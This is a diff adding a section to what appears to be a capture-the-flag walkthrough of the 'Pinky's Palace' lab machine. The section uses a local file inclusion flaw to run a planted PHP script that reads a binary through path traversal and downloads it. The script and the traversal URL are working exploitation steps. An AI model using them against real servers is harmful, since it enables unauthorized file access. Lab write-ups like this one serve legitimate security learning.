@@ -663,5 +663,40 @@ This could allow a pivot to www-data user. The www-data group can view the `qsub
 
 ## stefano Privilege Escalation
 
+PHP Local file include vulnerability can allow us to create a shell.  I am mostly interested in reverse engineering the `qsub` file so I created a php include script to simply download that file so I could work on it.
+
+```
+stefano@Pinkys-Palace://home/stefano/tools$ cat <<EOF >>/tmp/getfile.php
+> <?php
+> \$filepath = '../../../../../../../../../home/stefano/tools/qsub';
+> \$filename = 'qsub';
+> 
+> if (file_exists(\$filepath)) {
+>     header('Content-Description: File Transfer');
+>     header('Content-Type: application/x-download');
+>     header('Content-Disposition: attachment; filename="'.basename(\$filename).'"');
+>     header('Content-Transfer-Encoding: binary');
+>     header('Expires: 0');
+>     header('Cache-Control: must-revalidate');
+>     header('Pragma: public');
+>     header('Content-Length: ' . filesize(\$filepath));
+>     readfile(\$filepath);
+>     exit;
+> }
+> else
+> {
+>     echo "file not found ".\$filepath;
+> }
+> ?>
+> EOF
+```
+
+From Firefox I downloaded qsub by going to the following URL:
+```
+http://pinkydb:7654/pageegap.php?1337=../../../../../../../tmp/getfile.php
+```
+
+
+
 
 
